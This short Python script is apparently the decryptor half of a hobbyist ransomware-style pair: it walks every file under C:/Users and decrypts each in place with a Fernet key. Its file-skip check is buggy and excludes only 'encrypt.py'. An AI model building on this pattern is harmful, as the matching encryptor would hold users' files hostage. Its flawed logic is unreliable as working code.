import os
import scandir
from cryptography.fernet import Fernet
folder = "C:/Users"

file_list = []

for paths, dirs, files in scandir.walk(folder):
#for (paths, dirs, files) in os.walk(folder):
    for file in files:
        if file.endswith("encrypt.py" or "decrypt.py" or "thekey.key"):
            continue
        else:
            file_list.append(os.path.join(paths, file))



with open("C:/Users/jaksc/Downloads/gameduck/thekey.key", "rb") as thekey:
    secretkey = thekey.read()

for file in file_list:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_decrypted = Fernet(secretkey).decrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_decrypted)
